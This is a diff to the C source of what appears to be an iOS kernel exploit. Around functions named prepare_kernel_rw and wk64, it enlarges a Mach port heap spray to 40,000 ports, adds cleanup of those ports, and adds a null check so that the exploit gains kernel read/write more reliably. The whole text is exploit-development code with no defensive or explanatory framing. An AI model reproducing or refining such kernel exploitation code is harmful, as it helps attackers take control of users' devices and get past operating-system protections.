@@ -509,8 +509,11 @@ void wk64(uint64_t address, uint64_t value){
 uint64_t prepare_kernel_rw() {
   int prealloc_size = 0x900; // kalloc.4096
   
-  for (int i = 0; i < 2000; i++){
-    prealloc_port(prealloc_size);
+  const int nports = 40000;
+  mach_port_t *ports = malloc(nports * sizeof(mach_port_t));
+  sleep(1);
+  for (int i = 0; i < nports; i++){
+    ports[i] = prealloc_port(prealloc_size);
   }
   
   // these will be contiguous now, convienient!
@@ -549,6 +552,9 @@ uint64_t prepare_kernel_rw() {
   }
   
   kernel_buffer_base = buf[1];
+  if (!kernel_buffer_base) {
+    return 0;
+  }
   
   // receive the message on second
   receive_prealloc_msg(second_port);
@@ -588,6 +594,9 @@ uint64_t prepare_kernel_rw() {
   oob_port = first_port;
   target_uc = uc;
   
+  for (int i = 0; i < nports; i++){
+    mach_port_destroy(mach_task_self(), ports[i]);
+  }
   printf("all done!\n");
   
   return kernel_base;
